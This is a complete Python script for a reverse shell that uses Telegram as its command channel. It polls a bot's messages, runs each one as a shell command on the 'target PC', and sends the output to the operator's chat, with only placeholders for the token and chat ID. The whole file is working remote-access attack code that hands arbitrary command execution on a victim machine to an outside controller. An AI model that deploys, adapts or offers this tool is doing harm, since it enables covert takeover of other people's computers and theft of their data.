import subprocess
import requests
import time
import logging

# ===== CONFIG ===== #
BOT_TOKEN = "<YOURTOKEN>"  # Replace with your bot token
CHAT_ID = "<YOURADMINID>"      # Replace with your chat ID
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
POLL_INTERVAL = 1  # Check for new messages every 1 second

# ===== LOGGING ===== #
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ===== BOT FUNCTIONS ===== #
def send_telegram_message(text: str) -> bool:
    """Send a message to Telegram."""
    try:
        response = requests.post(
            f"{API_URL}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text}
        )
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Failed to send message: {e}")
        return False

def execute_command(command: str) -> str:
    """Execute a command and return output."""
    try:
        # Handle custom Telegram commands
        if command.startswith("/send "):
            message = command[6:]
            if send_telegram_message(f"📩 Message from target PC: {message}"):
                return "✅ Message sent to Telegram."
            else:
                return "❌ Failed to send message."

        # Handle system commands
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=15
        )
        return result.stdout if result.stdout else result.stderr or "✅ Command executed (no output)."
    except subprocess.TimeoutExpired:
        return "⌛ Command timed out."
    except Exception as e:
        return f"⚠️ Error: {str(e)}"

# ===== MAIN LOOP ===== #
def main():
    logger.info("Starting Telegram remote shell...")
    send_telegram_message("🔌 Reverse shell connected.")

    last_update_id = None
    try:
        while True:
            updates = requests.get(
                f"{API_URL}/getUpdates",
                params={"offset": last_update_id, "timeout": 30}
            ).json()

            if updates.get("result"):
                for update in updates["result"]:
                    last_update_id = update["update_id"] + 1
                    if "message" in update and "text" in update["message"]:
                        command = update["message"]["text"].strip()
                        logger.info(f"Executing: {command}")

                        # Handle exit command
                        if command.lower() in ("exit", "quit"):
                            send_telegram_message("🔴 Session closed.")
                            return

                        output = execute_command(command)
                        send_telegram_message(f"💻 **Command:** `{command}`\n📝 **Output:**\n```\n{output}\n```")

            time.sleep(POLL_INTERVAL)
    except KeyboardInterrupt:
        send_telegram_message("⚠️ Session terminated manually.")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        send_telegram_message(f"💥 CRASH: {str(e)}")

if __name__ == "__main__":
    main()
